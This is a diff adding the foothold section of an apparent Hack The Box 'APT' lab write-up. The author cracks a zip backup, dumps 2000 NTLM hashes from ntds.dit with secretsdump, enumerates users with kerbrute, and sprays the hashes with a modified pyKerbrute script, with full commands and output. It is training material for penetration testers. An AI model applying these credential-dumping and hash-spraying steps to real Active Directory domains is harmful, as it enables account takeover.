@@ -277,7 +277,7 @@ SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$         
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share 
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share
 ```
-
+## Foothold/User
 - There is a `backup` share with `zip` file
   - Download it
 ```
@@ -310,6 +310,151 @@ drw-rw-rw-          0  Thu Sep 24 08:31:03 2020 ..
 # get backup.zip
 ```
 
-## Foothold
+- The archive is password-protected
+```
+└─$ unzip backup.zip           
+Archive:  backup.zip
+   creating: Active Directory/
+[backup.zip] Active Directory/ntds.dit password: 
+   skipping: Active Directory/ntds.dit  incorrect password
+   skipping: Active Directory/ntds.jfm  incorrect password
+   creating: registry/
+   skipping: registry/SECURITY       incorrect password
+   skipping: registry/SYSTEM         incorrect password
+```
+
+- Let's crack it
+```
+└─$ zip2john backup.zip > backup.hash
+ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
+ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
+ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
+ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
+ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
+ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+```
+```
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iloveyousomuch   (backup.zip)     
+1g 0:00:00:00 DONE (2023-10-10 16:15) 100.0g/s 819200p/s 819200c/s 819200C/s newzealand..whitetiger
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+- Unzip the archive
+```
+└─$ unzip backup.zip                                         
+Archive:  backup.zip
+[backup.zip] Active Directory/ntds.dit password: 
+  inflating: Active Directory/ntds.dit  
+  inflating: Active Directory/ntds.jfm  
+  inflating: registry/SECURITY       
+  inflating: registry/SYSTEM 
+```
+
+- We can dump the hashes
+  - There 2000 of them
+```
+└─$ impacket-secretsdump -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > hashes
+```
+```
+└─$ grep ':::' hashes | wc -l                                
+2000
+```
+
+- We have to check if hashes are valid  
+  - But first we need to find valid users
+  - We saw port `88` open, so we can use `kerbrute`
+  - Add `dead:beef::b885:d62a:d679:573f apt.htb htb.local` to `/etc/hosts`
+```
+└─$ grep ':::' hashes | awk -F: '{print $1}' > users.list
+```
+```
+└─$ kerbrute userenum --dc htb.local -d htb.local users.list -o valid.users.list
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/10/23 - Ronnie Flathers @ropnop
+
+2023/10/10 16:37:27 >  Using KDC(s):
+2023/10/10 16:37:27 >   htb.local:88
+
+2023/10/10 16:37:32 >  [+] VALID USERNAME:       APT$@htb.local
+2023/10/10 16:37:32 >  [+] VALID USERNAME:       Administrator@htb.local
+2023/10/10 16:41:33 >  [+] VALID USERNAME:       henry.vinson@htb.local
+2023/10/10 16:55:25 >  Done! Tested 2000 usernames (3 valid) in 1078.807 seconds
+```
+
+- But the hash didn't work
+```
+└─$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u henry.vinson -H '2de80758521541d19cabba480b260e8f' 
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE
+```
+- Since `kerbrute` doesn't support hashes, we have to use [pyKerbrute](https://github.com/3gstudent/pyKerbrute)
+  - I tried [smartbrute](https://github.com/ShutdownRepo/smartbrute), but it didn't work
+  - We will be testing for password-reuse
+  - First we retrieve `ntlm` hashes 
+```
+└─$ grep ':::' hashes | awk -F: '{print $4}' > ntlm.hashes
+```
+
+- I spent quite some time figuring out why my `pyKerbrute` refused to work
+  - It looks like it had a pull request which changed the original crypto modules
+  - Revert back to `from _crypto import ARC4, MD5, MD4`
+
+![](./images/3.png)
+
+- Or you can change the line `from Crypto.Cipher import MD4, MD5` to `from Crypto.Hash import MD4, MD5`
+  - https://pycryptodome.readthedocs.io/en/latest/src/hash/hash.html
+  - Also change the socket family from `ipv4` to `ipv6`
+
+```
+└─$ sed -i "s/AF_INET/AF_INET6/g" ADPwdSpray.py       
+```
+
+- I also had to modify the `pyKerbrute`'s `ADPwdSpray.py`
+```
+...
+if __name__ == '__main__':
+    
+    domain = 'htb.local'
+    username = 'henry.vinson'
+    kdc_a = 'dead:beef::b885:d62a:d679:573f'
+    ntlm_hashes = open(sys.argv[1], 'r').readlines()
+
+    for ntlm in ntlm_hashes:
+        ntlm = ntlm.strip('\r\n')
+        user_key = (RC4_HMAC, ntlm.decode('hex'))
+        passwordspray_tcp(domain, username, user_key, kdc_a, ntlm)
+
+```
+
+- Now start the script
+  - It could 10-20 minutes
+```
+└─$ python2.7 ./ADPwdSpray.py ntlm.hashes
+[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
+```
+
+- Check if hash is valid
+```
+└─$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u henry.vinson -H 'e53d87d42adaa3ca32bdb34a876cbffb'             
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb 
+```
+
+- But the user doesn't have `winrm` permissions
 
 ## Root
